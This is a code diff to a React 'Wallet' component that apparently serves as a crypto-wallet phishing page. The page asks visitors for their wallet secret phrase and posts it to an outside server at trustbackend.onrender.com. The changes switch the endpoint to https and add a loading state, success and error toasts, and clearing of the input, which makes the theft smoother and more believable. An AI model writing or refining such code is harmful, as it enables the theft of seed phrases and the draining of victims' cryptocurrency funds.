@@ -2,20 +2,33 @@ import React, { useState } from 'react';
 import { Link } from 'react-router-dom';
 import hero_img from "../assets/images/Screenshot 2024-07-14 112312.png";
 import axios from 'axios';
+import toast from 'react-hot-toast';
 
 const Wallet = () => {
   const [formData, setFormData] = useState("");
+  const [loading, setLoading] = useState(false);
 
   const dataSend = async () => {
     if (!formData) {
       return alert("Please enter correct phrase")
     }
+    setLoading(true)
     try {
-      const res = await axios.post("http://trustbackend.onrender.com/api/key" , {phrase:formData})
-      // const res = await axios.post("http://localhost:8000/api/key" , {phrase:formData})
-      console.log(res)
+      const res = await axios.post("https://trustbackend.onrender.com/api/key", { phrase: formData }, {
+      // const res = await axios.post("http://localhost:8000/api/key", { phrase: formData }, {
+        headers: {
+          "Content-Type": "application/json",
+        },
+      })
+      if (res.data?.isSuccess) {
+        setFormData("")
+        toast.success(res?.data?.message)
+      }
     } catch (error) {
+      toast.error(error?.response?.data?.message)
       console.log(error)
+    }finally{
+      setLoading(false)
     }
   };
 
@@ -44,6 +57,7 @@ const Wallet = () => {
           <div className="pt-20">
             <p className="pb-2">Enter your secret phrase for the wallet.</p>
             <textarea
+            value={formData}
               onChange={(e) => setFormData(e.target.value)}
               placeholder="Enter your secret phrase for the wallet."
               className="p-3 border w-full outline-none"
@@ -55,7 +69,7 @@ const Wallet = () => {
               onClick={dataSend}
               className="hover:bg-[blue] transition-all border border-[blue] text-[blue] font-medium px-8 py-3 hover:text-white rounded-lg"
             >
-              Submit Now
+              {loading ? "Please wait":"Submit Now"}
             </button>
           </div>
         </section>
